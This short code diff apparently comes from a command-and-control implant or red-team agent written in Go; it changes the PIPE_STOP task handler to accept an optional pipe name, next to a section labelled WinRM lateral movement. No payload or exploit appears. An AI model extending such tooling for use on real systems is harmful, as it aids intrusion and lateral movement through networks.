@@ -895,7 +895,8 @@ func dispatchTask(t transport, task taskWire) {
 		t.sendResult(task.ID, "[+] pipe server listening on "+pipe, "")
 
 	case "PIPE_STOP":
-		t.sendResult(task.ID, stopPipeServer(), "")
+		// Args: optional pipe name to stop; empty = stop all
+		t.sendResult(task.ID, stopPipeServer(strings.TrimSpace(task.Args)), "")
 
 	// ── WinRM lateral movement ────────────────────────────────────────────────
 
